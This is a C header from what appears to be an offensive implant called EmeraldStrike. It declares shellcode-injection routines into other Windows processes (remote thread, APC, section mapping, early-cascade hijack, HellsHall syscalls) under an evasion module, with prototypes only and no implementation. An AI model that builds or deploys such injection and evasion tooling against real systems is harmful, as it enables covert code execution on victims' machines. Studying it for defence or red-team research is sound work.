#ifndef EMERALDSTRIKE_INJECTION_H
#define EMERALDSTRIKE_INJECTION_H

#include "../config.h"
#include "../common.h"

// ─── Public entry points ───
// inject_shellcode: open the pid, dispatch the technique, close up.
// hInitialThread: for spawn-based flows, the target's initial thread handle
// from the SUSPENDED CreateProcess (techniques that hijack process startup
// - early cascade - require it; others ignore it; NULL for arbitrary pids).
BOOL inject_shellcode(PINSTANCE inst, DWORD pid, BYTE* shellcode, DWORD sc_len, DWORD* step);
HANDLE inject_shellcode_into(PINSTANCE inst, HANDLE hProcess, HANDLE hInitialThread, BYTE* shellcode, DWORD sc_len, DWORD* step);

// ─── Techniques (one translation unit each, src/evasion/injection_<tech>.cc;
// each compiles only under its INJECTION_TECHNIQUE gate except hellshall) ───
#if INJECTION_TECHNIQUE == INJECT_CRT
HANDLE inject_crt(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step);
#endif
#if INJECTION_TECHNIQUE == INJECT_APC
HANDLE inject_apc(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step);
#endif
#if INJECTION_TECHNIQUE == INJECT_SECTION
HANDLE inject_section(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step);
#endif
#if INJECTION_TECHNIQUE == INJECT_CUSTOM
HANDLE inject_custom(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step);
#endif
#if INJECTION_TECHNIQUE == INJECT_CASCADE
HANDLE inject_cascade(PINSTANCE inst, HANDLE hProcess, HANDLE hInitialThread, BYTE* shellcode, DWORD sc_len, DWORD* step);
#endif
#ifdef INCLUDE_EVASION_HELLSHALL
HANDLE inject_hellshall(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step, BOOL bForceRWX);
#endif

#endif // EMERALDSTRIKE_INJECTION_H
